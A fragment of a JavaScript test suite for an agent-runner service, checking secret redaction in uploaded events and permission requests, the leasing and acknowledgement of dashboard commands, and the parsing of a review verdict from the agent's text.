    const secret = 'runner-token-secret-value';
    const permission = {
      requestKey: 'perm-1',
      kind: 'permission',
      payload: {
        subject: { command: `printf 'Authorization: Bearer ${secret}'` },
        access_token: secret,
        options: ['allow'],
      },
    };
    const runtime = fakeRuntime();
    const { api } = await runClaim({
      runtime,
      runnerOptions: { runnerToken: secret },
      clientOverrides: { postClaimRequest: vi.fn(async (...args) => { seen.push(args); }) },
      runtimeFactory: vi.fn((options) => {
        runtime.runInitialPrompt.mockImplementationOnce(async () => {
          await options.onRequest(permission);
          await options.onRequest({ requestKey: 'form-1', kind: 'elicitation', payload: { fields: ['answer'] } });
          return { sessionId: 'acp', messageId: 'm', stopReason: 'end_turn' };
        });
        return runtime;
      }),
    });
    expect(seen).toEqual([
      ['runner-session', 42, {
        requestKey: 'perm-1',
        kind: 'permission',
        payload: {
          subject: { command: "printf 'Authorization: Bearer [REDACTED]'" },
          access_token: '[REDACTED]',
          options: ['allow'],
        },
      }],
      ['runner-session', 42, { requestKey: 'form-1', kind: 'elicitation', payload: { fields: ['answer'] } }],
    ]);
    expect(permission.payload.subject.command).toContain(secret);
    expect(api.reportClaim).toHaveBeenCalledTimes(1);
  });

  it('persists ACP request cancellation through the current runner claim owner', async () => {
    const order = [];
    const runtime = fakeRuntime();
    const { api } = await runClaim({
      runtime,
      clientOverrides: {
        postClaimRequest: vi.fn(async () => {
          order.push('opened');
        }),
        cancelClaimRequest: vi.fn(async () => {
          order.push('cancelled');
        }),
      },
      runtimeFactory: vi.fn((options) => {
        runtime.runInitialPrompt.mockImplementationOnce(async () => {
          await options.onRequest({ requestKey: 'perm-1', kind: 'permission', payload: {} });
          await options.onRequestCancelled({ requestKey: 'perm-1', kind: 'permission' });
          return { sessionId: 'acp', messageId: 'm', stopReason: 'end_turn' };
        });
        return runtime;
      }),
    });

    expect(order).toEqual(['opened', 'cancelled']);
    expect(api.cancelClaimRequest).toHaveBeenCalledWith('runner-session', 42, 'perm-1');
  });

  it.each([
    ['event upload', 'postClaimEvents'],
    ['request upload', 'postClaimRequest'],
  ])('treats %s failure as transient and never reports completion', async (_label, method) => {
    const runtime = fakeRuntime();
    const runtimeFactory = vi.fn((options) => {
      runtime.runInitialPrompt.mockImplementationOnce(async () => {
        if (method === 'postClaimEvents') await options.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'running' } });
        else await options.onRequest({ requestKey: 'r', kind: 'permission', payload: {} });
        return { sessionId: 'acp', messageId: 'm', stopReason: 'end_turn' };
      });
      return runtime;
    });
    const { api } = await runClaim({ runtime, runtimeFactory, clientOverrides: { [method]: vi.fn(async () => { throw new Error('upload failed'); }) }, runnerOptions: { eventBatchSize: 1 } });
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'failed', failure_kind: 'transient' }));
    expect(api.reportClaim).not.toHaveBeenCalledWith(expect.objectContaining({ status: 'completed' }));
  });

  it('redacts long environment credentials without treating common short boolean values as secrets', async () => {
    const previousBoolean = process.env.TOKENIZERS_PARALLELISM;
    const previousToken = process.env.TEST_PROVIDER_API_TOKEN;
    process.env.TOKENIZERS_PARALLELISM = 'false';
    process.env.TEST_PROVIDER_API_TOKEN = 'provider-token-value-123456789';
    try {
      const runtime = fakeRuntime();
      const { api } = await runClaim({
        runtime,
        runtimeFactory: vi.fn((options) => {
          runtime.runInitialPrompt.mockImplementationOnce(async () => {
            await options.onEvent({
              sessionId: 'acp',
              update: {
                sessionUpdate: 'agent_message_chunk',
                content: { type: 'text', text: 'boolean=false token=provider-token-value-123456789' },
              },
            });
            return { sessionId: 'acp', messageId: 'm', stopReason: 'end_turn' };
          });
          return runtime;
        }),
        runnerOptions: { eventBatchSize: 1 },
      });
      const encoded = JSON.stringify(api.postClaimEvents.mock.calls[0][2]);
      expect(encoded).toContain('boolean=false');
      expect(encoded).not.toContain('provider-token-value-123456789');
      expect(encoded).toContain('[REDACTED]');
    } finally {
      if (previousBoolean === undefined) delete process.env.TOKENIZERS_PARALLELISM;
      else process.env.TOKENIZERS_PARALLELISM = previousBoolean;
      if (previousToken === undefined) delete process.env.TEST_PROVIDER_API_TOKEN;
      else process.env.TEST_PROVIDER_API_TOKEN = previousToken;
    }
  });
});

describe('dashboard commands', () => {
  it.each([
    [{ id: 'c', kind: 'cancel', payload: {} }, 'cancel', []],
    [{ id: 'a', kind: 'permission', request_key: 'perm-1', payload: { answer: { optionId: 'allow' } } }, 'answerRequest', ['perm-1', { optionId: 'allow' }]],
    [{ id: 'e', kind: 'elicitation', request_key: 'form-1', payload: { answer: { values: { name: 'Ada' } } } }, 'answerRequest', ['form-1', { values: { name: 'Ada' } }]],
  ])('dispatches $kind and acknowledges only after local application', async (command, method, args) => {
    const gate = deferred();
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => gate.promise);
    const commands = vi.fn().mockResolvedValueOnce({ commands: [command] }).mockResolvedValue({ commands: [] });
    const api = client({ pollClaimCommands: commands });
    let workPolls = 0;
    api.poll = vi.fn(async () => (++workPolls === 1 ? WORK : null));
    const runner = makeRunner({ client: api, log: logger(), createAcpRuntime: vi.fn(() => runtime), cwd: '/repo', acpCommand: 'agent', commandPollMs: 1 });
    const started = runner.start();
    await waitFor(() => runtime[method].mock.calls.length === 1);
    expect(api.pollClaimCommands).toHaveBeenCalledWith('runner-session', 42, transportOptions());
    expect(runtime[method]).toHaveBeenCalledWith(...args);
    expect(api.ackClaimCommand).toHaveBeenCalledWith('runner-session', 42, command.id, 'acked', expect.anything(), transportOptions());
    gate.resolve({ sessionId: 'acp', messageId: 'm', stopReason: command.kind === 'cancel' ? 'cancelled' : 'end_turn' });
    await waitFor(() => api.reportClaim.mock.calls.length === 1);
    await runner.shutdown();
    await started;
    if (command.kind === 'cancel') expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'cancelled' }));
  });

  it('does not apply an immediate command whose acknowledgement deadline elapsed', async () => {
    const initialTurn = deferred();
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
      pollClaimCommands: vi.fn()
        .mockResolvedValueOnce({ commands: [{ id: 'expired-cancel', kind: 'cancel', payload: {} }] })
        .mockResolvedValue({ commands: [] }),
      renewClaimCommand: vi.fn(async () => ({ renewed: false })),
    });
    const runner = makeRunner({
      client: api,
      log: logger(),
      createAcpRuntime: vi.fn(() => runtime),
      cwd: '/repo',
      acpCommand: 'agent',
      commandPollMs: 1,
    });
    const started = runner.start();
    await waitFor(() => api.renewClaimCommand.mock.calls.length === 1);
    expect(runtime.cancel).not.toHaveBeenCalled();
    expect(api.ackClaimCommand).not.toHaveBeenCalled();
    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
    await waitFor(() => api.reportClaim.mock.calls.length === 1);
    await runner.shutdown();
    await started;
  });

  it('applies a prompt lease that settles with the initial turn', async () => {
    const initialTurn = deferred();
    const leasedCommands = deferred();
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
      pollClaimCommands: vi.fn()
        .mockImplementationOnce(() => leasedCommands.promise)
        .mockResolvedValue({ commands: [] }),
    });
    const runner = makeRunner({ client: api, log: logger(), createAcpRuntime: vi.fn(() => runtime), cwd: '/repo', acpCommand: 'agent', commandPollMs: 50 });
    const started = runner.start();
    await waitFor(() => api.pollClaimCommands.mock.calls.length === 1);
    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
    await new Promise((resolve) => setTimeout(resolve, 0));
    leasedCommands.resolve({ commands: [{ id: 'settling-prompt', kind: 'prompt', payload: { text: 'continue' } }] });
    await waitFor(() => runtime.prompt.mock.calls.length > 0 || api.ackClaimCommand.mock.calls.length > 0);
    expect(runtime.prompt).toHaveBeenCalledWith('continue', { onAccepted: expect.any(Function) });
    expect(api.renewClaimCommand).toHaveBeenCalledWith('runner-session', 42, 'settling-prompt');
    expect(api.ackClaimCommand).toHaveBeenCalledWith('runner-session', 42, 'settling-prompt', 'acked', { applied: true, messageId: 'message-2' }, transportOptions());
    await waitFor(() => api.reportClaim.mock.calls.length === 1);
    await runner.shutdown();
    await started;
  });

  it('queues a prompt during the initial turn without blocking later request answers', async () => {
    const initialTurn = deferred();
    const promptedTurn = deferred();
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
    runtime.prompt.mockImplementationOnce(async (_text, { onAccepted }) => {
      await onAccepted({ messageId: 'prompted' });
      return promptedTurn.promise;
    });
    const commands = [
      { id: 'queued-prompt', kind: 'prompt', payload: { text: 'continue after the turn' } },
      { id: 'permission-answer', kind: 'permission', request_key: 'permission-1', payload: { answer: { optionId: 'allow' } } },
    ];
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
      pollClaimCommands: vi.fn().mockResolvedValueOnce({ commands }).mockResolvedValue({ commands: [] }),
    });
    const runner = makeRunner({
      client: api,
      log: logger(),
      createAcpRuntime: vi.fn(() => runtime),
      cwd: '/repo',
      acpCommand: 'agent',
      commandPollMs: 1,
      commandLeaseRenewMs: 5,
    });
    const started = runner.start();
    await waitFor(() => runtime.answerRequest.mock.calls.length === 1);
    expect(runtime.answerRequest).toHaveBeenCalledWith('permission-1', { optionId: 'allow' });
    expect(api.ackClaimCommand).toHaveBeenCalledWith('runner-session', 42, 'permission-answer', 'acked', { applied: true }, transportOptions());
    expect(runtime.prompt).not.toHaveBeenCalled();
    expect(api.ackClaimCommand).not.toHaveBeenCalledWith('runner-session', 42, 'queued-prompt', expect.anything(), expect.anything(), expect.anything());
    await waitFor(() => api.renewClaimCommand.mock.calls.length >= 1);
    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
    await waitFor(() => runtime.prompt.mock.calls.length === 1);
    expect(runtime.prompt).toHaveBeenCalledWith('continue after the turn', { onAccepted: expect.any(Function) });
    await waitFor(() => api.ackClaimCommand.mock.calls.some((call) => call[2] === 'queued-prompt'));
    expect(api.ackClaimCommand).toHaveBeenCalledWith(
      'runner-session',
      42,
      'queued-prompt',
      'acked',
      { applied: true, messageId: 'prompted' },
      transportOptions(),
    );
    promptedTurn.resolve({ messageId: 'prompted', stopReason: 'end_turn' });
    await waitFor(() => api.reportClaim.mock.calls.length === 1);
    await runner.shutdown();
    await started;
  });


  it('keeps a same-batch prompt when an answer drives the current turn idle first', async () => {
    const initialTurn = deferred();
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
    let runtimeOptions;
    runtime.answerRequest.mockImplementationOnce(async () => {
      await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'running' } });
      initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
      await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'idle', stopReason: 'end_turn' } });
    });
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
      pollClaimCommands: vi.fn()
        .mockResolvedValueOnce({
          commands: [
            { id: 'answer-first', kind: 'permission', request_key: 'permission-1', payload: { answer: { optionId: 'allow' } } },
            { id: 'prompt-second', kind: 'prompt', payload: { text: 'continue' } },
          ],
        })
        .mockResolvedValue({ commands: [] }),
    });
    const runner = makeRunner({
      client: api,
      log: logger(),
      createAcpRuntime: vi.fn((options) => {
        runtimeOptions = options;
        return runtime;
      }),
      cwd: '/repo',
      acpCommand: 'agent',
      commandPollMs: 1,
    });
    const started = runner.start();
    await waitFor(() => runtime.prompt.mock.calls.length === 1);

    expect(runtime.prompt).toHaveBeenCalledWith('continue', { onAccepted: expect.any(Function) });
    expect(api.ackClaimCommand).toHaveBeenCalledWith(
      'runner-session',
      42,
      'prompt-second',
      'acked',
      { applied: true, messageId: 'message-2' },
      transportOptions(),
    );
    await waitFor(() => api.reportClaim.mock.calls.length === 1);
    await runner.shutdown();
    await started;
  });

  it('does not submit a prompt whose command lease expired before ACP acceptance', async () => {
    const initialTurn = deferred();
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
      pollClaimCommands: vi.fn()
        .mockResolvedValueOnce({ commands: [{ id: 'expired-prompt', kind: 'prompt', payload: { text: 'too late' } }] })
        .mockResolvedValue({ commands: [] }),
      renewClaimCommand: vi.fn(async () => ({ renewed: false })),
    });
    const runner = makeRunner({
      client: api,
      log: logger(),
      createAcpRuntime: vi.fn(() => runtime),
      cwd: '/repo',
      acpCommand: 'agent',
      commandPollMs: 1,
    });
    const started = runner.start();
    await waitFor(() => api.pollClaimCommands.mock.calls.length >= 1);
    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
    await waitFor(() => api.renewClaimCommand.mock.calls.length === 1);
    await waitFor(() => api.reportClaim.mock.calls.length === 1);

    expect(runtime.prompt).not.toHaveBeenCalled();
    expect(api.ackClaimCommand).not.toHaveBeenCalledWith(
      'runner-session',
      42,
      'expired-prompt',
      expect.anything(),
      expect.anything(),
      expect.anything(),
    );
    await runner.shutdown();
    await started;
  });

  it('closes a runtime before awaiting a pending prompt when command polling fails', async () => {
    const initialTurn = deferred();
    const promptedTurn = deferred();
    const secondPoll = deferred();
    const order = [];
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
    runtime.prompt.mockImplementationOnce(async (_text, { onAccepted }) => {
      await onAccepted({ messageId: 'prompted' });
      return promptedTurn.promise;
    });
    runtime.close.mockImplementationOnce(async () => {
      order.push('close');
      promptedTurn.reject(new Error('runtime closed'));
    });
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
      pollClaimCommands: vi.fn()
        .mockResolvedValueOnce({ commands: [{ id: 'queued', kind: 'prompt', payload: { text: 'next turn' } }] })
        .mockImplementationOnce(() => secondPoll.promise),
      reportClaim: vi.fn(async () => {
        order.push('report');
        return { ok: true };
      }),
    });
    const runner = makeRunner({ client: api, log: logger(), createAcpRuntime: vi.fn(() => runtime), cwd: '/repo', acpCommand: 'agent', commandPollMs: 1 });
    const started = runner.start();
    await waitFor(() => api.pollClaimCommands.mock.calls.length === 2);
    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
    await waitFor(() => runtime.prompt.mock.calls.length === 1);
    secondPoll.reject(new Error('command polling failed'));
    await waitFor(() => runtime.close.mock.calls.length === 1);
    const completion = Promise.race([
      waitFor(() => api.reportClaim.mock.calls.length === 1).then(() => 'reported'),
      new Promise((resolve) => setTimeout(() => resolve('timed-out'), 200)),
    ]);
    await expect(completion).resolves.toBe('reported');
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'failed', failure_kind: 'transient' }));
    expect(order.indexOf('close')).toBeGreaterThanOrEqual(0);
    expect(order.indexOf('report')).toBeGreaterThan(order.indexOf('close'));
    await runner.shutdown();
    await started;
  });

  it('keeps command service alive when an initial idle snapshot precedes active state', async () => {
    const initialTurn = deferred();
    const leased = deferred();
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
      pollClaimCommands: vi.fn().mockImplementationOnce(() => leased.promise).mockResolvedValue({ commands: [] }),
    });
    let runtimeOptions;
    const runner = makeRunner({
      client: api,
      log: logger(),
      createAcpRuntime: vi.fn((options) => {
        runtimeOptions = options;
        return runtime;
      }),
      cwd: '/repo',
      acpCommand: 'agent',
      commandPollMs: 1,
    });
    const started = runner.start();
    await waitFor(() => api.pollClaimCommands.mock.calls.length === 1);
    await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'idle' } });
    leased.resolve({ commands: [
      { id: 'permission-after-snapshot', kind: 'permission', request_key: 'permission-1', payload: { answer: { optionId: 'allow' } } },
    ] });
    await waitFor(() => runtime.answerRequest.mock.calls.length === 1);
    expect(api.ackClaimCommand).toHaveBeenCalledWith('runner-session', 42, 'permission-after-snapshot', 'acked', { applied: true }, transportOptions());
    await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'running' } });
    await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'idle', stopReason: 'end_turn' } });
    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
    await waitFor(() => api.reportClaim.mock.calls.length === 1);
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'completed' }));
    await runner.shutdown();
    await started;
  });

  it('fails every command returned after command service shutdown as not applied', async () => {
    const initialTurn = deferred();
    const leased = deferred();
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
      pollClaimCommands: vi.fn().mockImplementationOnce(() => leased.promise).mockResolvedValue({ commands: [] }),
    });
    let runtimeOptions;
    const createAcpRuntime = vi.fn((options) => {
      runtimeOptions = options;
      return runtime;
    });
    const runner = makeRunner({ client: api, log: logger(), createAcpRuntime, cwd: '/repo', acpCommand: 'agent', commandPollMs: 1 });
    const started = runner.start();
    await waitFor(() => api.pollClaimCommands.mock.calls.length === 1);
    await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'running' } });
    await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'idle', stopReason: 'end_turn' } });
    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
    leased.resolve({ commands: [
      { id: 'late-1', kind: 'cancel', payload: {} },
      { id: 'late-2', kind: 'permission', request_key: 'r', payload: { answer: { optionId: 'allow' } } },
    ] });
    await waitFor(() => api.ackClaimCommand.mock.calls.length === 2);
    expect(api.ackClaimCommand.mock.calls).toEqual([
      ['runner-session', 42, 'late-1', 'failed', { error: 'Command was not applied' }, transportOptions()],
      ['runner-session', 42, 'late-2', 'failed', { error: 'Command was not applied' }, transportOptions()],
    ]);
    expect(runtime.cancel).not.toHaveBeenCalled();
    expect(runtime.answerRequest).not.toHaveBeenCalled();
    await waitFor(() => api.reportClaim.mock.calls.length === 1);
    await runner.shutdown();
    await started;
  });

  it('fails the unprocessed remainder of a leased command batch as not applied', async () => {
    const initialTurn = deferred();
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
    runtime.cancel.mockImplementationOnce(async () => {
      initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'cancelled' });
      return { stopReason: 'cancelled' };
    });
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
      pollClaimCommands: vi.fn().mockResolvedValueOnce({ commands: [
        { id: 'cancel-now', kind: 'cancel', payload: {} },
        { id: 'never-prompted', kind: 'prompt', payload: { text: 'must not run' } },
        { id: 'never-answered', kind: 'elicitation', request_key: 'form', payload: { answer: { values: { x: 'y' } } } },
      ] }).mockResolvedValue({ commands: [] }),
    });
    const runner = makeRunner({ client: api, log: logger(), createAcpRuntime: vi.fn(() => runtime), cwd: '/repo', acpCommand: 'agent', commandPollMs: 1 });
    const started = runner.start();
    await waitFor(() => api.ackClaimCommand.mock.calls.length === 3);
    expect(api.ackClaimCommand.mock.calls).toEqual([
      ['runner-session', 42, 'cancel-now', 'acked', { applied: true }, transportOptions()],
      ['runner-session', 42, 'never-prompted', 'failed', { error: 'Command was not applied' }, transportOptions()],
      ['runner-session', 42, 'never-answered', 'failed', { error: 'Command was not applied' }, transportOptions()],
    ]);
    expect(runtime.prompt).not.toHaveBeenCalled();
    expect(runtime.answerRequest).not.toHaveBeenCalled();
    await waitFor(() => api.reportClaim.mock.calls.length === 1);
    await runner.shutdown();
    await started;
  });

  it('acknowledges definite local rejection as failed', async () => {
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(async () => { await new Promise((resolve) => setTimeout(resolve, 30)); return { sessionId: 'a', messageId: 'm', stopReason: 'end_turn' }; });
    runtime.prompt.mockRejectedValueOnce(new Error('ACP session is not ready for a prompt'));
    const { api } = await runClaim({ runtime, clientOverrides: { pollClaimCommands: vi.fn().mockResolvedValueOnce({ commands: [{ id: 'bad', kind: 'prompt', payload: { text: 'x' } }] }).mockResolvedValue({ commands: [] }) } });
    expect(api.ackClaimCommand).toHaveBeenCalledWith('runner-session', 42, 'bad', 'failed', expect.objectContaining({ error: expect.any(String) }), transportOptions());
  });

  it('acknowledges ambiguous transport application as uncertain and fails the claim transiently', async () => {
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(async () => { await new Promise((resolve) => setTimeout(resolve, 30)); return { sessionId: 'a', messageId: 'm', stopReason: 'end_turn' }; });
    runtime.prompt.mockRejectedValueOnce(new Error('ACP prompt acceptance is uncertain'));
    const { api } = await runClaim({ runtime, clientOverrides: { pollClaimCommands: vi.fn().mockResolvedValueOnce({ commands: [{ id: 'ambiguous', kind: 'prompt', payload: { text: 'x' } }] }).mockResolvedValue({ commands: [] }) } });
    expect(api.ackClaimCommand).toHaveBeenCalledWith('runner-session', 42, 'ambiguous', 'uncertain', expect.objectContaining({ error: expect.any(String) }), transportOptions());
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'failed', failure_kind: 'transient' }));
  });
});

describe('review output', () => {
  it.each([
    ['<!-- reviewer-result: { "status": "FAIL" } -->', 'fail'],
    ['<!-- reviewer-result: { "status": "PASS" } -->', 'pass'],
  ])('derives %s verdict from normalized bounded agent text', async (text, verdict) => {
    const runtime = fakeRuntime();
    const { api } = await runClaim({
      work: { ...WORK, claim_type: 'review' },
      runtime,
      runtimeFactory: vi.fn((options) => {
        runtime.runInitialPrompt.mockImplementationOnce(async () => {
          await options.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'agent_message_chunk', content: { type: 'text', text } } });
          return { sessionId: 'acp', messageId: 'm', stopReason: 'end_turn' };
        });
        return runtime;
      }),
    });
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'completed', verdict }));
  });

  it('bounds normalized agent text so an evicted verdict marker cannot affect the report', async () => {
    const runtime = fakeRuntime();
    const marker = '<!-- reviewer-result: { "status": "FAIL" } -->';
    const { api } = await runClaim({
      work: { ...WORK, claim_type: 'review' },
      runtime,
      runnerOptions: { agentTextLimitBytes: 64 },
      runtimeFactory: vi.fn((options) => {
        runtime.runInitialPrompt.mockImplementationOnce(async () => {
          await options.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'agent_message_chunk', content: { type: 'text', text: `${marker}${'x'.repeat(128)}` } } });
          return { sessionId: 'acp', messageId: 'm', stopReason: 'end_turn' };
        });
        return runtime;
      }),
    });
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'completed' }));
    expect(api.reportClaim.mock.calls[0][0]).not.toHaveProperty('verdict');
  });
});
